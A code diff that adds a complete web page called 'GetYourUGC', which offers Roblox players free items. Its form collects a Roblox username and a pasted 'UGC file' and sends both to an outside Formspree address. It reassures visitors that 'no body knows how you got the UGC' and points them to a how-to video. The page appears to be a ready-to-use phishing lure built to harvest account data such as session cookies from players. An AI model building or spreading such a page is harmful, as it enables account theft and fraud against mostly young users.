@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="icon" type="image/png" href="https://i.imgur.com/jV8cqA6.png">
+  <title>GetYourUGC</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      color: white;
+    }
+
+    #particles-js {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      background: #0f0f0f;
+      z-index: -1;
+      top: 0;
+      left: 0;
+    }
+
+    .main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 60px 20px;
+    }
+
+    .container {
+      background: rgba(26, 26, 26, 0.9);
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.6);
+      width: 350px;
+      text-align: center;
+      backdrop-filter: blur(10px);
+      margin-bottom: 30px;
+    }
+
+    /* Header wrapper with image above text */
+    .header {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .header img {
+      width: 50%; /* half of original size */
+      height: auto;
+      margin-bottom: 10px;
+    }
+
+    h1 {
+      font-size: 28px;
+      margin: 0;
+    }
+
+    p {
+      color: #aaa;
+    }
+
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #262626;
+      color: white;
+      font-size: 14px;
+    }
+
+    textarea {
+      height: 120px;
+      resize: none;
+    }
+
+    input:focus, textarea:focus {
+      outline: none;
+      box-shadow: 0 0 8px #4CAF50;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: linear-gradient(45deg, #4CAF50, #2ecc71);
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      opacity: 0.9;
+    }
+
+    .footer {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .info {
+      max-width: 700px;
+      margin-top: 20px;
+      width: 100%;
+    }
+
+    .card {
+      background: rgba(26, 26, 26, 0.9);
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      text-align: left;
+      transition: 0.3s;
+      border: 1px solid #2a2a2a;
+      backdrop-filter: blur(10px);
+    }
+
+    .card:hover {
+      transform: translateY(-5px);
+      border-color: #4CAF50;
+    }
+
+    .card h2 {
+      margin-bottom: 10px;
+      font-size: 20px;
+    }
+
+    .card p {
+      color: #bbb;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .roblox a, .discord a {
+      color: white;
+      text-decoration: none;
+      padding: 12px 18px;
+      border-radius: 10px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      transition: 0.3s;
+      font-size: 14px;
+    }
+
+    .roblox a {
+      background: #ff4757;
+    }
+    .roblox a:hover {
+      background: #e84118;
+      transform: scale(1.05);
+    }
+
+    .discord a {
+      background: #2ecc71;
+    }
+    .discord a:hover {
+      background: #27ae60;
+      transform: scale(1.05);
+    }
+
+    .roblox img,
+    .discord img {
+      width: 20px;
+      height: 20px;
+      border-radius: 4px;
+      transition: 0.25s;
+    }
+
+    .roblox a:hover img {
+      transform: scale(1.15);
+      box-shadow: 0 0 6px #4CAF50;
+    }
+    .discord a:hover img {
+      transform: scale(1.15);
+      box-shadow: 0 0 6px #2ecc71;
+    }
+
+  </style>
+</head>
+
+<body>
+
+<div id="particles-js"></div>
+
+<div class="main">
+
+  <div class="container">
+    <!-- Header with image above text -->
+<div class="header">
+  <img src="https://i.imgur.com/jV8cqA6.png" alt="Header Icon" style="width:20%; height:auto; margin-bottom:10px;">
+  <h1>GetYourUGC</h1>
+</div>
+    <p>Get any Roblox UGC you want for free!</p>
+
+    <form action="https://formspree.io/f/mkoppawp" method="POST">
+      <input type="text" name="roblox_username" placeholder="Your Roblox Username" required>
+      <textarea name="ugc_file" placeholder="Paste your UGC file here..." required></textarea>
+      <button type="submit">Submit</button>
+    </form>
+
+    <div class="footer">
+      Powered by S4NTY 💻
+    </div>
+  </div>
+
+  <div class="info">
+    <div class="card">
+      <h2>How this site works?</h2>
+      <p>GetYourUGC is a simple platform where Roblox players can get any type of UGC for free.</p>
+    </div>
+
+    <div class="card">
+      <h2>How It Works?</h2>
+      <p>Enter your Roblox username and paste your UGC file.</p>
+    </div>
+
+    <div class="card">
+      <h2>Why choose us?</h2>
+      <p>We use secured protocol and we don't save your logs.</p>
+      <p>No body knows how you got the UGC.</p>
+    </div>
+  </div>
+
+  <div style="max-width: 700px; width: 100%; margin-top: 30px; text-align: center;">
+    <h2>Watch this video to know how to use this site</h2>
+    <iframe src="https://www.youtube.com/embed/CLgwftrTUq8" width="100%" height="315" style="border-radius:12px;"></iframe>
+
+    <div style="display: flex; justify-content: space-between; margin-top: 15px; max-width: 100%;">
+      <div class="roblox">
+        <a href="https://www.roblox.com/users/5715215513/profile" target="_blank">
+          <img src="https://cdn-icons-png.flaticon.com/512/5968/5968763.png">
+          Visit my Roblox Profile
+        </a>
+      </div>
+
+      <div class="discord">
+        <a href="https://discord.com/users/1273569463093952564" target="_blank">
+          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png">
+          Contact me on Discord
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+
+<script>
+window.addEventListener("load", function () {
+  particlesJS("particles-js", {
+    particles: {
+      number: { value: 120, density: { enable: true, value_area: 800 } },
+      color: { value: "#4CAF50" },
+      shape: { type: "circle" },
+      opacity: { value: 0.5 },
+      size: { value: 2 },
+      line_linked: {
+        enable: true,
+        distance: 120,
+        color: "#4CAF50",
+        opacity: 0.4,
+        width: 1
+      },
+      move: {
+        enable: true,
+        speed: 2,
+        straight: false
+      }
+    },
+    interactivity: {
+      events: {
+        onhover: { enable: true, mode: "grab" }
+      },
+      modes: {
+        grab: {
+          distance: 140,
+          line_linked: { opacity: 0.8 }
+        }
+      }
+    },
+    retina_detect: true
+  });
+});
+</script>
+
+</body>
+</html>
